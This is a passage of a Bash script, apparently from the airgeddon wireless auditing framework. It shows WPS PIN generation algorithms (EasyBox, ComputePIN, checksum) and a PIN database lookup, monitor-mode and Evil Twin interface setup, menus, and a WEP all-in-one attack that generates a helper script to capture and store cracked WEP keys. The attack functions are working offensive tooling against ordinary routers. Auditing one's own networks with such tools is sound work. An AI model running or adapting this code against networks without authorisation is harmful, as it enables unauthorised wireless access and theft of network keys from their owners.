	X1=$((K1 ^ hex_to_dec[3]))
	X2=$((K1 ^ hex_to_dec[2]))
	X3=$((K1 ^ hex_to_dec[1]))
	Y1=$((K2 ^ 0x${hexi[1]}))
	Y2=$((K2 ^ 0x${hexi[2]}))
	Z1=$((0x${hexi[2]} ^ hex_to_dec[3]))
	Z2=$((0x${hexi[3]} ^ hex_to_dec[2]))

	easybox_pin=$(printf '%08d\n' "$((0x$X1$X2$Y1$Y2$Z1$Z2$X3))" | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}' | cut -c -7 | awk '{for(i=length; i!=0; i--) x=x substr($0, i, 1);} END {print x}')
}

#Calculate the last digit on pin following the checksum rule
function pin_checksum_rule() {

	debug_print

	current_calculated_pin=$((10#${1} * 10))

	accum=0
	accum=$((accum + 3 * (current_calculated_pin/10000000 % 10)))
	accum=$((accum + current_calculated_pin/1000000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/100000 % 10)))
	accum=$((accum + current_calculated_pin/10000 % 10))
	accum=$((accum + 3 * (current_calculated_pin/1000 % 10)))
	accum=$((accum + current_calculated_pin/100 % 10))
	accum=$((accum + 3 * (current_calculated_pin/10 % 10)))

	control_digit=$((accum % 10))
	checksum_digit=$((10 - control_digit))
	checksum_digit=$((checksum_digit % 10))
}

#Manage the calls to check common wps pin algorithms
function check_and_set_common_algorithms() {

	debug_print

	echo
	language_strings "${language}" 388 "blue"
	declare -g calculated_pins=("${wps_default_generic_pin}")

	calculate_computepin_algorithm_step1
	pin_checksum_rule "${computepin_pin}"
	calculate_computepin_algorithm_step2
	calculated_pins+=("${computepin_pin}")

	calculate_easybox_algorithm
	pin_checksum_rule "${easybox_pin}"
	easybox_pin=$(printf '%08d\n' $((current_calculated_pin + checksum_digit)))
	calculated_pins+=("${easybox_pin}")

	if integrate_algorithms_pins; then
		echo
		language_strings "${language}" 389 "yellow"
	fi
}

#Integrate calculated pins from algorithms into pins array
function integrate_algorithms_pins() {

	debug_print

	some_calculated_pin_included=0
	for pin in "${calculated_pins[@]}"; do
		this_pin_already_included=0
		for item in "${pins_found[@]}"; do
			if [ "${item}" = "${pin}" ]; then
				this_pin_already_included=1
				break
			fi
		done

		if [ ${this_pin_already_included} -eq 0 ]; then
			pins_found+=(${pin})
			counter_pins_found=$((counter_pins_found + 1))
			some_calculated_pin_included=1
		fi
	done

	if [ "${some_calculated_pin_included}" -eq 1 ]; then
		return 0
	fi
	return 1
}

#Search for target wps bssid mac in pin database and set the vars to be used
function search_in_pin_database() {

	debug_print

	bssid_found_in_db=0
	counter_pins_found=0
	declare -g pins_found=()
	for item in "${!PINDB[@]}"; do
		if [ "${item}" = "${six_wpsbssid_first_digits_clean}" ]; then
			bssid_found_in_db=1
			arrpins=(${PINDB[${item//[[:space:]]/ }]})
			for item2 in "${arrpins[@]}"; do
				counter_pins_found=$((counter_pins_found+1))
				pins_found+=(${item2})
			done
			break
		fi
	done
}

#Prepare monitor mode avoiding the use of airmon-ng or airmon-zc generating two interfaces from one
function prepare_et_monitor() {

	debug_print

	disable_rfkill

	phy_iface=$(basename "$(readlink "/sys/class/net/${interface}/phy80211")")
	iface_phy_number=${phy_iface:3:1}
	iface_monitor_et_deauth="mon${iface_phy_number}"

	iw phy "${phy_iface}" interface add "${iface_monitor_et_deauth}" type monitor 2> /dev/null
	ifconfig "${iface_monitor_et_deauth}" up > /dev/null 2>&1
	iwconfig "${iface_monitor_et_deauth}" channel "${channel}" > /dev/null 2>&1
}

#Assure the mode of the interface before the Evil Twin process
function prepare_et_interface() {

	debug_print

	et_initial_state=${ifacemode}

	if [ "${ifacemode}" != "Managed" ]; then
		new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
		ifacemode="Managed"
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "${interface}" != "${new_interface}" ]; then
			if check_interface_coherence; then
				interface=${new_interface}
			fi
			echo
			language_strings "${language}" 15 "yellow"
		fi
	fi
}

#Restore the state of the interfaces after Evil Twin process
function restore_et_interface() {

	debug_print

	echo
	language_strings "${language}" 299 "blue"

	disable_rfkill

	mac_spoofing_desired=0

	iw dev "${iface_monitor_et_deauth}" del > /dev/null 2>&1

	if [ "${et_initial_state}" = "Managed" ]; then
		ifconfig "${interface}" down > /dev/null 2>&1
		iwconfig "${interface}" mode managed > /dev/null 2>&1
		ifconfig "${interface}" up > /dev/null 2>&1
		ifacemode="Managed"
	else
		new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)
		desired_interface_name=""
		[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
		if [ -n "${desired_interface_name}" ]; then
			echo
			language_strings "${language}" 435 "red"
			language_strings "${language}" 115 "read"
			return
		fi
		ifacemode="Monitor"
		[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"
		if [ "${interface}" != "${new_interface}" ]; then
			interface=${new_interface}
		fi
	fi
}

#Unblock if possible the interface if blocked
function disable_rfkill() {

	debug_print

	if hash rfkill 2> /dev/null; then
		rfkill unblock all > /dev/null 2>&1
	fi
}

#Put the interface on managed mode and manage the possible name change
function managed_option() {

	debug_print

	if ! check_to_set_managed; then
		return
	fi

	disable_rfkill

	language_strings "${language}" 17 "blue"
	ifconfig "${interface}" up

	new_interface=$(${airmon} stop "${interface}" 2> /dev/null | grep station | head -n 1)
	ifacemode="Managed"
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "${interface}" != "${new_interface}" ]; then
		if check_interface_coherence; then
			interface=${new_interface}
		fi
		echo
		language_strings "${language}" 15 "yellow"
	fi

	echo
	language_strings "${language}" 16 "yellow"
	language_strings "${language}" 115 "read"
}

#Put the interface on monitor mode and manage the possible name change
function monitor_option() {

	debug_print

	if ! check_to_set_monitor; then
		return
	fi

	disable_rfkill

	language_strings "${language}" 18 "blue"

	ifconfig "${interface}" up

	if ! iwconfig "${interface}" rate 1M > /dev/null 2>&1; then
		echo
		language_strings "${language}" 20 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	if [ "${check_kill_needed}" -eq 1 ]; then
		language_strings "${language}" 19 "blue"
		${airmon} check kill > /dev/null 2>&1
		nm_processes_killed=1
	fi

	new_interface=$(${airmon} start "${interface}" 2> /dev/null | grep monitor)

	desired_interface_name=""
	[[ ${new_interface} =~ ^You[[:space:]]already[[:space:]]have[[:space:]]a[[:space:]]([A-Za-z0-9]+)[[:space:]]device ]] && desired_interface_name="${BASH_REMATCH[1]}"
	if [ -n "${desired_interface_name}" ]; then
		echo
		language_strings "${language}" 435 "red"
		language_strings "${language}" 115 "read"
		return
	fi

	ifacemode="Monitor"
	[[ ${new_interface} =~ \]?([A-Za-z0-9]+)\)?$ ]] && new_interface="${BASH_REMATCH[1]}"

	if [ "${interface}" != "${new_interface}" ]; then
		if check_interface_coherence; then
			interface=${new_interface}
		fi
		echo
		language_strings "${language}" 21 "yellow"
	fi

	echo
	language_strings "${language}" 22 "yellow"
	language_strings "${language}" 115 "read"
}

#Check the interface mode
function check_interface_mode() {

	debug_print

	if ! execute_iwconfig_fix; then
		ifacemode="(Non wifi card)"
		return 0
	fi

	modemanaged=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | cut -d ':' -f 2 | cut -d ' ' -f 1)

	if [[ ${modemanaged} = "Managed" ]]; then
		ifacemode="Managed"
		return 0
	fi

	modemonitor=$(iwconfig "${interface}" 2> /dev/null | grep Mode: | awk '{print $4}' | cut -d ':' -f 2)

	if [[ ${modemonitor} = "Monitor" ]]; then
		ifacemode="Monitor"
		return 0
	fi

	language_strings "${language}" 23 "red"
	language_strings "${language}" 115 "read"
	exit_code=1
	exit_script_option
}

#Option menu
function option_menu() {

	debug_print

	clear
	language_strings "${language}" 443 "title"
	current_menu="option_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 47 "green"
	print_simple_separator
	language_strings "${language}" 78
	print_simple_separator
	if [ "${auto_update}" -eq 1 ]; then
		language_strings "${language}" 455
	else
		language_strings "${language}" 449
	fi
	if [ "${allow_colorization}" -eq 1 ]; then
		language_strings "${language}" 456
	else
		language_strings "${language}" 450
	fi
	if [ "${auto_change_language}" -eq 1 ]; then
		language_strings "${language}" 468
	else
		language_strings "${language}" 467
	fi
	language_strings "${language}" 447
	print_simple_separator
	language_strings "${language}" 174
	print_hint ${current_menu}

	read -r option_selected
	case ${option_selected} in
		1)
			language_menu
		;;
		2)
			if [ "${auto_update}" -eq 1 ]; then
				ask_yesno 457 "no"
				if [ "${yesno}" = "y" ]; then
					if auto_update_toggle; then
						echo
						language_strings "${language}" 461 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				language_strings "${language}" 459 "yellow"
				ask_yesno 458 "no"
				if [ "${yesno}" = "y" ]; then
					if auto_update_toggle; then
						echo
						language_strings "${language}" 460 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		3)
			if ! hash ccze 2> /dev/null; then
				echo
				language_strings "${language}" 464 "yellow"
			fi

			if [ "${allow_colorization}" -eq 1 ]; then
				ask_yesno 462 "yes"
				if [ "${yesno}" = "y" ]; then
					if allow_colorization_toggle; then
						echo
						language_strings "${language}" 466 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				ask_yesno 463 "yes"
				if [ "${yesno}" = "y" ]; then
					if allow_colorization_toggle; then
						echo
						language_strings "${language}" 465 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		4)
			if [ "${auto_change_language}" -eq 1 ]; then
				ask_yesno 469 "no"
				if [ "${yesno}" = "y" ]; then
					if auto_change_language_toggle; then
						echo
						language_strings "${language}" 473 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			else
				echo
				language_strings "${language}" 471 "yellow"
				ask_yesno 470 "no"
				if [ "${yesno}" = "y" ]; then
					if auto_change_language_toggle; then
						echo
						language_strings "${language}" 472 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
					language_strings "${language}" 115 "read"
				fi
			fi
		;;
		5)
			ask_yesno 478 "yes"
			if [ "${yesno}" = "y" ]; then
				get_current_permanent_language
				if [ "${language}" = "${current_permanent_language}" ]; then
					echo
					language_strings "${language}" 480 "red"
				else
					local auto_change_value
					auto_change_value=$(grep "auto_change_language=" "${scriptfolder}${scriptname}" | head -n 1 | awk -F "=" '{print $2}')
					if [ "${auto_change_value}" -eq 1 ]; then
						echo
						language_strings "${language}" 479 "yellow"
						auto_change_language_toggle
					fi

					if set_permanent_language; then
						echo
						language_strings "${language}" 481 "blue"
					else
						echo
						language_strings "${language}" 417 "red"
					fi
				fi
				language_strings "${language}" 115 "read"
			fi
		;;
		6)
			return
		;;
		*)
			invalid_menu_option
		;;
	esac

	option_menu
}

#Language change menu
function language_menu() {

	debug_print

	clear
	language_strings "${language}" 87 "title"
	current_menu="language_menu"
	initialize_menu_and_print_selections
	echo
	language_strings "${language}" 81 "green"
	print_simple_separator
	language_strings "${language}" 79
	language_strings "${language}" 80
	language_strings "${language}" 113
	language_strings "${language}" 116
	language_strings "${language}" 249
	language_strings "${language}" 308
	language_strings "${language}" 320
	language_strings "${language}" 482
	print_simple_separator
	language_strings "${language}" 446
	print_hint ${current_menu}

	read -r language_selected
	echo
	case ${language_selected} in
		1)
			if [ "${language}" = "ENGLISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ENGLISH"
				language_strings "${language}" 83 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		2)
			if [ "${language}" = "SPANISH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="SPANISH"
				language_strings "${language}" 84 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		3)
			if [ "${language}" = "FRENCH" ]; then
				language_strings "${language}" 251 "red"
			else
				language="FRENCH"
				language_strings "${language}" 112 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		4)
			if [ "${language}" = "CATALAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="CATALAN"
				language_strings "${language}" 117 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		5)
			if [ "${language}" = "PORTUGUESE" ]; then
				language_strings "${language}" 251 "red"
			else
				language="PORTUGUESE"
				language_strings "${language}" 248 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		6)
			if [ "${language}" = "RUSSIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="RUSSIAN"
				language_strings "${language}" 307 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		7)
			if [ "${language}" = "GREEK" ]; then
				language_strings "${language}" 251 "red"
			else
				language="GREEK"
				language_strings "${language}" 332 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		8)
			if [ "${language}" = "ITALIAN" ]; then
				language_strings "${language}" 251 "red"
			else
				language="ITALIAN"
				language_strings "${language}" 483 "yellow"
			fi
			language_strings "${language}" 115 "read"
		;;
		9)
			return
		;;
		*)
			invalid_language_selected
		;;
	esac

	language_menu
}

#Read the chipset for an interface
function set_chipset() {

	debug_print

	chipset=""
	sedrule1="s/^[0-9a-f]\{1,4\} \|^ //Ig"
	sedrule2="s/ Network Connection.*//Ig"
	sedrule3="s/ Wireless.*//Ig"
	sedrule4="s/ PCI Express.*//Ig"
	sedrule5="s/ \(Gigabit\|Fast\) Ethernet.*//Ig"
	sedrule6="s/ \[.*//"
	sedrule7="s/ (.*//"

	sedruleall="${sedrule1};${sedrule2};${sedrule3};${sedrule4};${sedrule5};${sedrule6};${sedrule7}"

	if [ -f "/sys/class/net/${1}/device/modalias" ]; then
		bus_type=$(cut -f 1 -d ":" < "/sys/class/net/${1}/device/modalias")

		if [ "${bus_type}" = "usb" ]; then
			vendor_and_device=$(cut -b 6-14 < "/sys/class/net/${1}/device/modalias" | sed 's/^.//;s/p/:/')
			if hash lsusb 2> /dev/null; then
				chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
			fi

		elif [[ "${bus_type}" =~ pci|ssb|bcma|pcmcia ]]; then
			if [[ -f /sys/class/net/${1}/device/vendor ]] && [[ -f /sys/class/net/${1}/device/device ]]; then
				vendor_and_device=$(cat "/sys/class/net/${1}/device/vendor"):$(cat "/sys/class/net/${1}/device/device")
				if hash lspci 2> /dev/null; then
					chipset=$(lspci -d "${vendor_and_device}" | cut -f 3 -d ":" | sed -e "${sedruleall}")
				fi
			else
				if hash ethtool 2> /dev/null; then
					ethtool_output=$(ethtool -i "${1}" 2>&1)
					vendor_and_device=$(printf "%s" "${ethtool_output}" | grep "bus-info" | cut -f 3 -d ":" | sed 's/^ //')
					if hash lspci 2> /dev/null; then
						chipset=$(lspci | grep "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
					fi
				fi
			fi
		fi
	elif [[ -f /sys/class/net/${1}/device/idVendor ]] && [[ -f /sys/class/net/${1}/device/idProduct ]]; then
		vendor_and_device=$(cat "/sys/class/net/${1}/device/idVendor"):$(cat "/sys/class/net/${1}/device/idProduct")
		if hash lsusb 2> /dev/null; then
			chipset=$(lsusb | grep -i "${vendor_and_device}" | head -n 1 | cut -f 3 -d ":" | sed -e "${sedruleall}")
		fi
	fi
}

#Internet interface selection menu
function select_internet_interface() {

	debug_print

	if [ "${return_to_et_main_menu}" -eq 1 ]; then
		return 1
	fi

	current_menu="evil_twin_attacks_menu"
	clear
	case ${et_mode} in
		"et_onlyap")
			language_strings "${language}" 270 "title"
		;;
		"et_sniffing")
			language_strings "${language}" 291 "title"
		;;
		"et_sniffing_sslstrip")
			language_strings "${language}" 292 "title"
		;;
		"et_sniffing_sslstrip2")
			language_strings "${language}" 397 "title"
		;;
		"et_captive_portal")
			language_strings "${language}" 293 "title"
		;;
	esac

	inet_ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v | grep "${interface}" -v)

	option_counter=0
	for item in ${inet_ifaces}; do

		if [ ${option_counter} -eq 0 ]; then
			language_strings "${language}" 279 "green"
			print_simple_separator
		fi

		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ -z "${chipset}" ]; then
			language_strings "${language}" 245 "blue"
		else
			echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
		fi
	done

	if [ ${option_counter} -eq 0 ]; then
		return_to_et_main_menu=1
		return_to_et_main_menu_from_beef=1
		echo
		language_strings "${language}" 280 "red"
		language_strings "${language}" 115 "read"
		return 1
	fi

	option_counter_back=$((option_counter + 1))
	if [ ${option_counter: -1} -eq 9 ]; then
		spaceiface+=" "
	fi
	print_simple_separator
	language_strings "${language}" 331
	print_hint ${current_menu}

	read -r inet_iface
	if [[ ! ${inet_iface} =~ ^[[:digit:]]+$ ]] || (( inet_iface < 1 || inet_iface > option_counter_back )); then
		invalid_internet_iface_selected
	elif [ "${inet_iface}" -eq ${option_counter_back} ]; then
		return_to_et_main_menu=1
		return_to_et_main_menu_from_beef=1
		return 1
	else
		option_counter2=0
		for item2 in ${inet_ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${inet_iface}" = "${option_counter2}" ]]; then
				internet_interface=${item2}
				break
			fi
		done
		return 0
	fi
}

#Interface selection menu
function select_interface() {

	debug_print

	clear
	language_strings "${language}" 88 "title"
	current_menu="select_interface_menu"
	language_strings "${language}" 24 "green"
	print_simple_separator
	ifaces=$(ip link | grep -E "^[0-9]+" | cut -d ':' -f 2 | awk '{print $1}' | grep lo -v)
	option_counter=0
	for item in ${ifaces}; do
		option_counter=$((option_counter + 1))
		if [ ${#option_counter} -eq 1 ]; then
			spaceiface="  "
		else
			spaceiface=" "
		fi
		set_chipset "${item}"
		echo -ne "${option_counter}.${spaceiface}${item} "
		if [ "${chipset}" = "" ]; then
			language_strings "${language}" 245 "blue"
		else
			echo -e "${blue_color}// ${yellow_color}Chipset:${normal_color} ${chipset}"
		fi
	done
	print_hint ${current_menu}

	read -r iface
	if [[ ! ${iface} =~ ^[[:digit:]]+$ ]] || (( iface < 1 || iface > option_counter )); then
		invalid_iface_selected
	else
		option_counter2=0
		for item2 in ${ifaces}; do
			option_counter2=$((option_counter2 + 1))
			if [[ "${iface}" = "${option_counter2}" ]]; then
				interface=${item2}
				interface_mac=$(ip link show "${interface}" | awk '/ether/ {print $2}')
				break
			fi
		done
	fi
}

#Read the user input on yes/no questions
function read_yesno() {

	debug_print

	echo
	language_strings "${language}" "${1}" "green"
	read -r yesno
}

#Validate the input on yes/no questions
function ask_yesno() {

	debug_print

	if [ -z "${2}" ]; then
		local regexp="^[YN]$|^YES$|^NO$"
		visual_choice="[y/n]"
	else
		local regexp="^[YN]$|^YES$|^NO$|^$"
		default_choice="${2}"
		if [[ ${default_choice^^} =~ ^[Y]$|^YES$ ]]; then
			default_choice="y"
			visual_choice="[Y/n]"
		else
			default_choice="n"
			visual_choice="[y/N]"
		fi
	fi

	yesno="null"
	while [[ ! ${yesno^^} =~ ${regexp} ]]; do
		read_yesno "${1}"
	done

	case ${yesno^^} in
		"Y"|"YES")
			yesno="y"
		;;
		"N"|"NO")
			yesno="n"
		;;
		"")
			yesno="${default_choice}"
		;;
	esac
}

#Read the user input on channel questions
function read_channel() {

	debug_print

	echo
	language_strings "${language}" 25 "green"
	if [ "${1}" = "wps" ]; then
		read -r wps_channel
	else
		read -r channel
	fi
}

#Validate the input on channel questions
function ask_channel() {

	debug_print

	local regexp="^([1-9]|1[0-4])$"

	if [ "${1}" = "wps" ]; then
		while [[ ! ${wps_channel} =~ ${regexp} ]]; do
			read_channel "wps"
		done
		echo
		language_strings "${language}" 365 "blue"
	else
		while [[ ! ${channel} =~ ${regexp} ]]; do
			read_channel
		done
		echo
		language_strings "${language}" 26 "blue"
	fi
}

#Read the user input on bssid questions
function read_bssid() {

	debug_print

	echo
	language_strings "${language}" 27 "green"
	if [ "${1}" = "wps" ]; then
		read -r wps_bssid
	else
		read -r bssid
	fi
}

#Validate the input on bssid questions
function ask_bssid() {

	debug_print

	local regexp="^([a-fA-F0-9]{2}:){5}[a-zA-Z0-9]{2}$"

	if [ "${1}" = "wps" ]; then
		if [ -z "${wps_bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${wps_bssid} =~ ${regexp} ]]; do
			read_bssid "wps"
		done
		echo
		language_strings "${language}" 364 "blue"
	else
		if [ -z "${bssid}" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ ! ${bssid} =~ ${regexp} ]]; do
			read_bssid
		done
		echo
		language_strings "${language}" 28 "blue"
	fi
	return 0
}

#Read the user input on essid questions
function read_essid() {

	debug_print

	echo
	language_strings "${language}" 29 "green"
	read -r essid
}

#Validate the input on essid questions
function ask_essid() {

	debug_print

	if [ -z "${essid}" ]; then

		if [ "${1}" = "verify" ]; then
			ask_yesno 439 "no"
			if [ "${yesno}" = "n" ]; then
				return 1
			fi
		fi

		while [[ -z "${essid}" ]]; do
			read_essid
		done
	elif [ "${essid}" = "(Hidden Network)" ]; then
		echo
		language_strings "${language}" 30 "yellow"
		read_essid
	fi

	echo
	language_strings "${language}" 31 "blue"
}

#Read the user input on custom pin questions
function read_custom_pin() {

	debug_print

	echo
	language_strings "${language}" 363 "green"
	read -r custom_pin
}

#Validate the input on custom pin questions
function ask_custom_pin() {

	debug_print

	local regexp="^[0-9]{8}$"
	custom_pin=""
	while [[ ! ${custom_pin} =~ ${regexp} ]]; do
		read_custom_pin
	done

	echo
	language_strings "${language}" 362 "blue"
}

#Read the user input on timeout questions
function read_timeout() {

	debug_print

	echo
	case ${1} in
		"standard")
			language_strings "${language}" 393 "green"
		;;
		"pixiedust")
			language_strings "${language}" 394 "green"
		;;
	esac
	read -r timeout
}

#Validate the user input for timeouts
function ask_wps_timeout() {

	debug_print

	case ${1} in
		"standard")
			local regexp="^[1-9][0-9]$|^100$|^$"
		;;
		"pixiedust")
			local regexp="^2[5-9]$|^[3-9][0-9]$|^[1-9][0-9]{2}$|^1[0-9]{3}$|^2[0-3][0-9]{2}$|^2400$|^$"
		;;
	esac

	timeout=0
	while [[ ! ${timeout} =~ ${regexp} ]]; do
		read_timeout "${1}"
	done

	if [ "${timeout}" = "" ]; then
		case ${1} in
			"standard")
				timeout=${timeout_secs_per_pin}
			;;
			"pixiedust")
				timeout=${timeout_secs_per_pixiedust}
			;;
		esac
	fi

	echo
	case ${1} in
		"standard")
			timeout_secs_per_pin=${timeout}
			language_strings "${language}" 391 "blue"
		;;
		"pixiedust")
			timeout_secs_per_pixiedust=${timeout}
			language_strings "${language}" 392 "blue"
		;;
	esac
}

#Validate if selected network has the needed type of encryption
function validate_network_encryption_type() {

	debug_print

	case ${1} in
		"WPA"|"WPA2")
			if [[ "${enc}" != "WPA" ]] && [[ "${enc}" != "WPA2" ]]; then
				echo
				language_strings "${language}" 137 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
		"WEP")
			if [ "${enc}" != "WEP" ]; then
				echo
				language_strings "${language}" 424 "red"
				language_strings "${language}" 115 "read"
				return 1
			fi
		;;
	esac

	return 0
}

#Execute wep all-in-one attack
#shellcheck disable=SC2164
function exec_wep_allinone_attack() {

	debug_print

	echo
	language_strings "${language}" 296 "yellow"
	language_strings "${language}" 115 "read"

	prepare_wep_attack
	set_wep_script

	recalculate_windows_sizes
	bash "${tmpdir}${wep_attack_file}" > /dev/null 2>&1 &
	wep_script_pid=$!

	set_wep_key_script
	bash "${tmpdir}${wep_key_handler}" "${wep_script_pid}" > /dev/null 2>&1 &
	wep_key_script_pid=$!

	echo
	language_strings "${language}" 434 "yellow"
	language_strings "${language}" 115 "read"

	kill_wep_windows
}

#Kill the wep attack processes
function kill_wep_windows() {

	debug_print

	kill "${wep_script_pid}" &> /dev/null
	wait $! 2>/dev/null

	kill "${wep_key_script_pid}" &> /dev/null
	wait $! 2>/dev/null

	readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
		kill "${item}" &> /dev/null
	done
}

#Prepare wep attack deleting temp files
function prepare_wep_attack() {

	debug_print

	tmpfiles_toclean=1

	rm -rf "${tmpdir}${wep_attack_file}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_key_handler}" > /dev/null 2>&1
	rm -rf "${tmpdir}${wep_data}"* > /dev/null 2>&1
	rm -rf "${tmpdir}${wepdir}" > /dev/null 2>&1
}

#Create here-doc bash script used for key handling on wep all-in-one attack
function set_wep_key_script() {

	debug_print

	exec 8>"${tmpdir}${wep_key_handler}"

	cat >&8 <<-EOF
		#!/usr/bin/env bash
		wep_key_found=0

		#Check if the wep password was captured and manage to save it on a file
		function manage_wep_pot() {

			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_hex_key_cmd="cat \"${tmpdir}${wepdir}wepkey.txt\""
	EOF

	cat >&8 <<-'EOF'
				wep_hex_key=$(eval "${wep_hex_key_cmd}")
				wep_ascii_key=$(echo "${wep_hex_key}" | awk 'RT{printf "%c", strtonum("0x"RT)}' RS='[0-9]{2}')
	EOF

	cat >&8 <<-EOF
				echo "" > "${weppotenteredpath}"
				{
	EOF

	cat >&8 <<-'EOF'
				date +%Y-%m-%d
	EOF

	cat >&8 <<-EOF
				echo -e "${wep_texts[${language},1]}"
				echo ""
				echo -e "BSSID: ${bssid}"
				echo -e "${wep_texts[${language},2]}: ${channel}"
				echo -e "ESSID: ${essid}"
				echo ""
				echo "---------------"
				echo ""
	EOF

	cat >&8 <<-'EOF'
				echo -e "ASCII: ${wep_ascii_key}"
	EOF

	cat >&8 <<-EOF
				echo -en "${wep_texts[${language},3]}:"
	EOF

	cat >&8 <<-'EOF'
				echo -en " ${wep_hex_key}"
				echo ""
	EOF

	cat >&8 <<-EOF
				} >> "${weppotenteredpath}"
				
				{
				echo ""
				echo "---------------"
				echo ""
				echo "${footer_texts[${language},1]}"
				} >> "${weppotenteredpath}"
			fi
		}

		#Kill the wep attack processes
		function kill_wep_script_windows() {

			readarray -t WEP_PROCESSES_TO_KILL < <(cat < "${tmpdir}${wepdir}${wep_processes_file}" 2> /dev/null)
	EOF

	cat >&8 <<-'EOF'
			for item in "${WEP_PROCESSES_TO_KILL[@]}"; do
				kill "${item}" &> /dev/null
			done
		}
	EOF

	cat >&8 <<-EOF
		while true; do
			sleep 1
			if [ -f "${tmpdir}${wepdir}wepkey.txt" ]; then
				wep_key_found=1
				break
			fi
	EOF

	cat >&8 <<-'EOF'
			wep_script_alive=$(ps uax | awk '{print $2}' | grep -E "^${1}$" 2> /dev/null)
			if [ -z "${wep_script_alive}" ]; then
				break
			fi
		done

		if [ "${wep_key_found}" -eq 1 ]; then
			manage_wep_pot
		fi
	EOF

	cat >&8 <<-EOF
		kill_wep_script_windows
		rm -rf "${tmpdir}${wepdir}${wep_processes_file}"
		touch "${tmpdir}${wepdir}${wep_processes_file}"
	EOF

	cat >&8 <<-'EOF'
		if [ "${wep_key_found}" -eq 1 ]; then
	EOF

	cat >&8 <<-EOF
			wep_key_cmd="echo -e '\t${yellow_color}${wep_texts[${language},5]} ${white_color}// ${blue_color}BSSID: ${normal_color}${bssid} ${yellow_color}// ${blue_color}${wep_texts[${language},2]}: ${normal_color}${channel} ${yellow_color}// ${blue_color}ESSID: ${normal_color}${essid}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${blue_color}${wep_texts[${language},4]}${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}ASCII: ${normal_color}'"
	EOF

	cat >&8 <<-'EOF'
			wep_key_cmd+="&& echo -en '${wep_ascii_key}'"
	EOF

	cat >&8 <<-EOF
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -en '\t${blue_color}${wep_texts[${language},3]}: ${normal_color}'"
	EOF

	cat >&8 <<-'EOF'
			wep_key_cmd+="&& echo -en '${wep_hex_key}'"
	EOF

	cat >&8 <<-EOF
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${pink_color}${wep_texts[${language},6]}: [${normal_color}${weppotenteredpath}${pink_color}]${normal_color}'"
			wep_key_cmd+="&& echo"
			wep_key_cmd+="&& echo -e '\t${yellow_color}${wep_texts[${language},7]}'"

			window_position="${g5_topright_window}"
			sleep 0.5
	EOF

	cat >&8 <<-'EOF'
			xterm -hold -bg black -fg white -geometry "${window_position}" -T "WEP Key Decrypted" -e "eval \"${wep_key_cmd}\"" > /dev/null 2>&1 &
			wep_key_window_pid=$!
			{
			echo -e "${wep_key_window_pid}"
	EOF

	cat >&8 <<-EOF
			} >> "${tmpdir}${wepdir}${wep_processes_file}"
		fi
	EOF
}

#Create here-doc bash script used for wep all-in-one attack
function set_wep_script() {

	debug_print

	current_mac=$(cat < "/sys/class/net/${interface}/address" 2> /dev/null)

	exec 6>"${tmpdir}${wep_attack_file}"

	cat >&6 <<-EOF
